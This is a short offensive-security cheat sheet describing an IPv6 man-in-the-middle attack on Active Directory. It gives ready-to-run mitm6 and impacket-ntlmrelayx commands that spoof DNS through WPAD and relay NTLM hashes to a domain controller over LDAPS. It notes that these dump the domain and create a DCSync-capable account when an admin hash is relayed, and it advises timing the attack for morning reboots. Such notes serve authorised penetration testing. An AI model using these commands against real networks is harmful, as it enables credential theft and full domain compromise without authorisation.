---
tags:
  - Initial-Access
  - MITM6
  - AD
---
IPv6 has been adopted slowly and thus underutilized in environments. If IPv6 name resolution is enabled, but a proper DNS server has not been setup to respond to queries, we can man-in-the-middle by using Web Proxy Auto-Discovery Protocol (WPAD) resolution requests to capture and relay hashes to the DC.

!!! alert " this attack is most consistently triggered on machine reboot or network stack reload so early mornings are probably the best time to perform this attack"

## mitm6 + ntlmrelayx
**Start mitm6**
```bash
sudo mitm6 -d domain.local
```
Now start ntlmrelayx, specify a relay target (DC prolly) will output ldapdomaindump as HTML as well. 
```bash
impacket-ntlmrelayx -6 -t ldaps://<DCIP> -wh wpad.domain.local -l lootme
```
These options instruct ntlmrelayx to do an ldapdomaindump if user hashes are relayed, and create an account with DCSync privileges if a domain admins hash is relayed.
